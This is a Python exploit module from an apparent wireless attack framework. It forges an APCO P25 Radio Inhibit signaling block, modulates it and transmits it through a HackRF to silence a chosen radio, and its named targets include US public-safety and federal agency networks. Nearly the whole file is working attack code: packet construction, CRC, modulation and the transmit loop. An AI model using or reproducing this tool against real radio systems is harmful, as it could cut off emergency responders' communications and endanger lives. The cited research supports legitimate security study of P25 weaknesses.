# Author: André Henrique (LinkedIn/X: @mrhenrike)
import struct
import subprocess
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """P25 Radio Inhibit Denial of Service.

    APCO P25 includes a Radio Inhibit function that allows
    infrastructure to remotely disable subscriber radios.  This
    mechanism lacks authentication in many P25 implementations,
    meaning any device capable of transmitting on the P25 control
    channel can send an Inhibit command to silence a target radio.

    The attacker sends a forged TSBK (Trunking Signaling Block)
    with the Radio Unit Monitor / Inhibit opcode targeting a
    specific radio ID, causing the target radio to enter inhibited
    state (unable to transmit or receive).

    Hardware requirements:
    - HackRF One ($300) for TX capability (required)
    - UHF antenna: 380-512 MHz or VHF: 136-174 MHz
    - GnuRadio with gr-op25 for P25 signal generation
    - Knowledge of target radio's Unit ID

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "P25 Radio Inhibit Denial of Service",
        "description": (
            "Exploits the unauthenticated Radio Inhibit mechanism in "
            "APCO P25 trunked radio systems.  Sends a forged TSBK "
            "(Trunking Signaling Block) with Radio Inhibit opcode "
            "to silence a target radio.  Requires HackRF One or "
            "USRP for TX on P25 control channel (UHF 380-512 MHz "
            "or VHF 136-174 MHz).  Target radio enters inhibited "
            "state and cannot transmit or receive until manually "
            "uninhibited."
        ),
        "authors": (
            "Sandy Clark et al. (P25 security research)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://www.mattblaze.org/papers/p25sec.pdf",
            "https://www.cisa.gov/sites/default/files/publications/p25_security_assessment.pdf",
        ),
        "disclosure_date": "2011-08-08",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "P25 trunked radio systems without Radio Inhibit authentication",
            "US public safety and federal agency P25 networks",
        ),
    }

    target = OptIP("", "Target radio Unit ID (decimal or hex)")
    port = OptPort(1, "Not used (radio frequency)")
    timeout = OptFloat(10.0, "Transmission timeout in seconds")
    frequency = OptFloat(460.0, "P25 control channel frequency in MHz")
    sdr_device = OptString("hackrf", "TX-capable SDR: hackrf, usrp")
    target_unit_id = OptInteger(0, "Target radio Unit ID to inhibit")
    system_id = OptInteger(0, "P25 system ID (WACN + System)")
    repeat_count = OptInteger(3, "Number of inhibit command repetitions")

    _TSBK_OPCODE_RADIO_INHIBIT = 0x28
    _TSBK_OPCODE_RADIO_UNINHIBIT = 0x29
    _P25_CONTROL_CHANNEL_BW = 12500

    def _build_tsbk_inhibit(self, unit_id: int, system_id: int) -> bytes:
        """Build a P25 TSBK Radio Inhibit message.

        TSBK format:
        - Opcode (8 bits): 0x28 for Radio Inhibit
        - Manufacturer (8 bits): 0x00 (standard)
        - Target Address (24 bits): Unit ID
        - Source Address (24 bits): Infrastructure ID (spoofed)
        - CRC (16 bits)
        """
        opcode = self._TSBK_OPCODE_RADIO_INHIBIT
        manufacturer = 0x00
        target_addr = unit_id & 0xFFFFFF
        source_addr = (system_id & 0xFFFF) << 8 | 0x01

        header = struct.pack(">BB", opcode, manufacturer)
        addresses = struct.pack(">I", target_addr)[1:4]
        addresses += struct.pack(">I", source_addr)[1:4]

        payload = header + addresses
        crc = self._crc16_ccitt(payload)
        return payload + struct.pack(">H", crc)

    def _crc16_ccitt(self, data: bytes) -> int:
        """Calculate CRC-16/CCITT for P25 TSBK."""
        crc = 0xFFFF
        for byte in data:
            crc ^= byte << 8
            for _ in range(8):
                if crc & 0x8000:
                    crc = (crc << 1) ^ 0x1021
                else:
                    crc <<= 1
                crc &= 0xFFFF
        return crc ^ 0xFFFF

    def _modulate_c4fm(self, tsbk_data: bytes) -> bytes:
        """Generate C4FM modulated baseband samples for the TSBK."""
        samples = bytearray()
        symbol_map = {0: -3, 1: -1, 2: 1, 3: 3}
        for byte in tsbk_data:
            for shift in (6, 4, 2, 0):
                dibit = (byte >> shift) & 0x03
                level = symbol_map[dibit]
                sample = int((level / 3.0) * 127) + 128
                samples.extend([sample] * 10)
        return bytes(samples)

    @mute
    def check(self) -> bool:
        """Verify TX-capable SDR is available."""
        if str(self.sdr_device) == "rtlsdr":
            return False
        try:
            result = subprocess.run(
                ["hackrf_transfer", "--help"],
                capture_output=True,
                timeout=5,
            )
            return result.returncode in (0, 1)
        except (OSError, subprocess.TimeoutExpired):
            return False

    def run(self) -> None:
        if self.target_unit_id <= 0:
            print_error("target_unit_id is required (target radio Unit ID)")
            return

        if str(self.sdr_device) == "rtlsdr":
            print_error("Radio Inhibit requires TX-capable SDR (HackRF or USRP)")
            return

        print_success(
            f"P25 Radio Inhibit DoS targeting Unit ID {self.target_unit_id} "
            f"on {self.frequency} MHz"
        )
        self._exploit()

    def _exploit(self) -> None:
        tsbk = self._build_tsbk_inhibit(
            int(self.target_unit_id),
            int(self.system_id),
        )
        print_info(f"TSBK Radio Inhibit payload: {tsbk.hex()}")

        baseband = self._modulate_c4fm(tsbk)
        print_info(f"C4FM baseband: {len(baseband)} samples")

        for i in range(int(self.repeat_count)):
            print_status(
                f"Transmitting Radio Inhibit command "
                f"({i + 1}/{self.repeat_count}) on {self.frequency} MHz"
            )
            freq_hz = int(float(self.frequency) * 1e6)
            cmd = [
                "hackrf_transfer",
                "-t", "-",
                "-f", str(freq_hz),
                "-s", str(self._P25_CONTROL_CHANNEL_BW * 2),
                "-a", "1",
                "-x", "30",
            ]
            try:
                proc = subprocess.Popen(
                    cmd,
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                )
                proc.communicate(input=baseband, timeout=float(self.timeout))
            except (OSError, subprocess.TimeoutExpired):
                print_error(f"TX failed on attempt {i + 1}")
                continue

            time.sleep(0.1)

        print_success(
            f"Radio Inhibit sent {self.repeat_count} times to "
            f"Unit ID {self.target_unit_id}. Target radio should "
            "enter inhibited state (no TX/RX) until manually "
            "uninhibited from the infrastructure console."
        )
